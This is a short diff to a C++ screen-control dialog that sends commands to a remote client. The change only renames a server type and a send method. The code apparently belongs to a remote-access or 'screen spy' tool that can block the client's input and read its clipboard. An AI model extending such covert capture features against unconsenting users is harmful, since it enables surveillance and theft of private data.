@@ -31,7 +31,7 @@ extern "C" void* x265_api_get_192() { return nullptr; }
 
 extern "C" char* __imp_strtok(char* str, const char* delim) { return strtok(str, delim); }
 
-CScreenSpyDlg::CScreenSpyDlg(CWnd* Parent, IOCPServer* IOCPServer, CONTEXT_OBJECT* ContextObject)
+CScreenSpyDlg::CScreenSpyDlg(CWnd* Parent, Server* IOCPServer, CONTEXT_OBJECT* ContextObject)
 	: DialogBase(CScreenSpyDlg::IDD, Parent, IOCPServer, ContextObject, 0)
 {
 	m_pCodec = nullptr;
@@ -74,7 +74,7 @@ CScreenSpyDlg::CScreenSpyDlg(CWnd* Parent, IOCPServer* IOCPServer, CONTEXT_OBJEC
 VOID CScreenSpyDlg::SendNext(void)
 {
 	BYTE	bToken = COMMAND_NEXT;
-	m_iocpServer->OnClientPreSending(m_ContextObject, &bToken, 1);
+	m_iocpServer->Send2Client(m_ContextObject, &bToken, 1);
 }
 
 
@@ -485,13 +485,13 @@ void CScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
 			BYTE	bToken[2];
 			bToken[0] = COMMAND_SCREEN_BLOCK_INPUT;
 			bToken[1] = !bIsChecked;
-			m_iocpServer->OnClientPreSending(m_ContextObject, bToken, sizeof(bToken));
+			m_iocpServer->Send2Client(m_ContextObject, bToken, sizeof(bToken));
 			break;
 		}
 	case IDM_GET_CLIPBOARD: //想要Client的剪贴板内容
 		{
 			BYTE	bToken = COMMAND_SCREEN_GET_CLIPBOARD;
-			m_iocpServer->OnClientPreSending(m_ContextObject, &bToken, sizeof(bToken));
+			m_iocpServer->Send2Client(m_ContextObject, &bToken, sizeof(bToken));
 			break;
 		}
 	case IDM_SET_CLIPBOARD: //给他
@@ -561,7 +561,7 @@ VOID CScreenSpyDlg::SendCommand(const MSG64* Msg)
 	szData[0] = COMMAND_SCREEN_CONTROL;
 	memcpy(szData + 1, Msg, sizeof(MSG64));
 	szData[length] = 0;
-	m_iocpServer->OnClientPreSending(m_ContextObject, szData, length);
+	m_iocpServer->Send2Client(m_ContextObject, szData, length);
 }
 
 BOOL CScreenSpyDlg::SaveSnapshot(void)
@@ -613,7 +613,7 @@ VOID CScreenSpyDlg::SendServerClipboard(void)
 	memcpy(szBuffer + 1, szClipboardVirtualAddress, iPacketLength - 1);
 	::GlobalUnlock(hGlobal); 
 	::CloseClipboard();
-	m_iocpServer->OnClientPreSending(m_ContextObject,(PBYTE)szBuffer, iPacketLength);
+	m_iocpServer->Send2Client(m_ContextObject,(PBYTE)szBuffer, iPacketLength);
 	delete[] szBuffer;
 }
 
